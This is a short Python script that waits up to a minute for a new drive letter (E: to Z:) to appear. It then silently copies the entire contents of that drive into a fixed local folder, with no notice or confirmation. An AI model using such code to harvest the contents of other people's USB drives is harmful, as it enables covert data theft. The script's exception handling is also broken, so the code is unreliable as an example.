import os
import time
from distutils.dir_util import copy_tree

timeout = time.time() + 60



while (True):
		i = ord("E")
		drives = set()
		while i <= ord("Z"):
			try:
				ad = chr(i) + ":\\"
				os.listdir(ad)
				drives.add(ad)
			except:
				i = i	
			i += 1
		if len(drives) >= 1:
			break 

		if time.time() > timeout:
			break


if len(drives) >= 1:
	try:
		#print(drives.pop())
		copy_tree(drives.pop(),"C:\\workspace\\copy-it\\files")

	except e:
	 	print("Erorr",e)

